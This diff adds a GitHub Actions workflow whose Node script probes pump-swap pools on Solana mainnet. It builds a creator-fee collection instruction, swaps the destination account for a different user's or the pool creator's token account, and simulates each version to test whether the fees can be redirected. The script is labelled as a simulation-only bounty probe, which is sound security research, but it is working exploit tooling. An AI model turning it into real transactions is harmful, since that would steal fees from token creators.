@@ -1,0 +1,51 @@
+name: mayhem-collect-creator-redirect-runtime
+on:
+  push:
+    paths:
+      - '.github/workflows/mayhem-collect-creator-redirect-runtime.yml'
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js @solana/spl-token
+      - name: Simulation-only collect creator fee redirect differential
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import {Connection,PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
+          import {getAssociatedTokenAddressSync,AccountLayout,ASSOCIATED_TOKEN_PROGRAM_ID} from '@solana/spl-token';
+          import {OnlinePumpAmmSdk,getPumpAmmProgram,coinCreatorVaultAuthorityPda,coinCreatorVaultAtaPda} from '@pump-fun/pump-swap-sdk';
+          const RPC='https://api.mainnet-beta.solana.com',c=new Connection(RPC,'confirmed'),online=new OnlinePumpAmmSdk(c),program=getPumpAmmProgram(c);
+          const USER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
+          const POOLS=[
+            ['dsv2','DSV2CUbhfEWRPRn9QRZWkYohRi47WEeauz8s89ekKBdN'],
+            ['feeprobe','3EUib8zfvYmJR5bWBXQFA9tm73NiRNcaFAZB3dGv2p8N'],
+            ['sharing_migrated','4ryg4gxs2MwVfuMeDXVKkRbmCYSgAA3B8eZtw6tT9bEq']
+          ];
+          const safe=v=>v?.toBase58?.()??v?.toString?.()??v;
+          function tokenAmount(ai){if(!ai?.data||ai.data.length<165)return null;try{return AccountLayout.decode(ai.data).amount.toString()}catch{return null}}
+          function parse(logs){const t=(logs??[]).join('\n');return {account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,interesting:(logs??[]).filter(x=>/Instruction:|AnchorError|Error Code|Error Number|Left:|Right:|failed|success|Collect|creator|TransferChecked|Transfer/i.test(x)).slice(-100)}}
+          async function simulate(label,ix,watch){const {blockhash}=await c.getLatestBlockhash('processed');const tx=new VersionedTransaction(new TransactionMessage({payerKey:USER,recentBlockhash:blockhash,instructions:[ix]}).compileToV0Message());const raw=Buffer.from(tx.serialize()).toString('base64');const req={jsonrpc:'2.0',id:1,method:'simulateTransaction',params:[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:watch.map(x=>x.toBase58())}}]};const r=await fetch(RPC,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-collect-creator/1.0'},body:JSON.stringify(req)});const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));const v=j.result.value,e=parse(v.logs);const post=(v.accounts??[]).map((a,i)=>({pk:watch[i].toBase58(),exists:!!a,owner:a?.owner??null,amount:a?.data?.[0]?tokenAmount({data:Buffer.from(a.data[0],'base64')}):null}));console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,account:e.account,code:e.code,num:e.num,post,interesting:e.interesting},null,2));return {v,e,post}}
+          function mutate(ix,index,pk){const keys=ix.keys.map(k=>({...k}));keys[index]={...keys[index],pubkey:pk};return new TransactionInstruction({programId:ix.programId,keys,data:Buffer.from(ix.data)})}
+          for(const [name,ps] of POOLS){
+            console.log('\n================',name,ps,'================');const poolPk=new PublicKey(ps);let pool;try{pool=await online.fetchPool(poolPk)}catch(e){console.log('POOL_FAIL',String(e));continue}
+            const quoteMint=pool.quoteMint;const qInfo=await c.getAccountInfo(quoteMint,'confirmed');if(!qInfo){console.log('NO_QUOTE_MINT');continue}const tokenProgram=qInfo.owner;const coinCreator=pool.coinCreator;const vaultAuth=coinCreatorVaultAuthorityPda(coinCreator);const vaultAta=coinCreatorVaultAtaPda(vaultAuth,quoteMint,tokenProgram);const creatorAta=getAssociatedTokenAddressSync(quoteMint,coinCreator,true,tokenProgram,ASSOCIATED_TOKEN_PROGRAM_ID);const userAta=getAssociatedTokenAddressSync(quoteMint,USER,true,tokenProgram,ASSOCIATED_TOKEN_PROGRAM_ID);
+            const [vaultInfo,creatorInfo,userInfo]=await c.getMultipleAccountsInfo([vaultAta,creatorAta,userAta],'confirmed');console.log('CONTEXT',JSON.stringify({pool:poolPk.toBase58(),isMayhem:pool.isMayhemMode,isCashback:pool.isCashbackCoin,quoteMint:quoteMint.toBase58(),tokenProgram:tokenProgram.toBase58(),coinCreator:coinCreator.toBase58(),vaultAuth:vaultAuth.toBase58(),vaultAta:vaultAta.toBase58(),vaultExists:!!vaultInfo,vaultAmount:tokenAmount(vaultInfo),creatorAta:creatorAta.toBase58(),creatorAtaExists:!!creatorInfo,creatorAmount:tokenAmount(creatorInfo),userAta:userAta.toBase58(),userAtaExists:!!userInfo,userAmount:tokenAmount(userInfo)},null,2));
+            if(!vaultInfo||BigInt(tokenAmount(vaultInfo)??'0')===0n){console.log('SKIP_ZERO_VAULT');continue}
+            let controlIx;try{controlIx=await program.methods.collectCoinCreatorFee().accountsPartial({quoteMint,quoteTokenProgram:tokenProgram,coinCreator,coinCreatorTokenAccount:creatorAta}).instruction()}catch(e){console.log('BUILD_FAIL',String(e));continue}
+            console.log('IX_KEYS',JSON.stringify(controlIx.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
+            const watch=[vaultAta,creatorAta,userAta];
+            if(creatorInfo)await simulate(name+'_control_to_creator',controlIx,watch);else console.log('CONTROL_CREATOR_ATA_MISSING');
+            const dstIndex=controlIx.keys.findIndex(k=>k.pubkey.equals(creatorAta));if(dstIndex<0){console.log('NO_DST_INDEX');continue}
+            if(userInfo)await simulate(name+'_redirect_to_user_existing_ata',mutate(controlIx,dstIndex,userAta),watch);else console.log('USER_ATA_MISSING_FOR_QUOTE');
+            // Cross-owner but same-mint authorized token account is the decisive destination-binding differential.
+            // Also test pool creator ATA if distinct and existing.
+            const poolCreatorAta=getAssociatedTokenAddressSync(quoteMint,pool.creator,true,tokenProgram,ASSOCIATED_TOKEN_PROGRAM_ID);const poolCreatorInfo=await c.getAccountInfo(poolCreatorAta,'confirmed');if(poolCreatorInfo&& !poolCreatorAta.equals(creatorAta))await simulate(name+'_redirect_to_pool_creator_ata',mutate(controlIx,dstIndex,poolCreatorAta),[vaultAta,creatorAta,poolCreatorAta]);
+          }
+          NODE
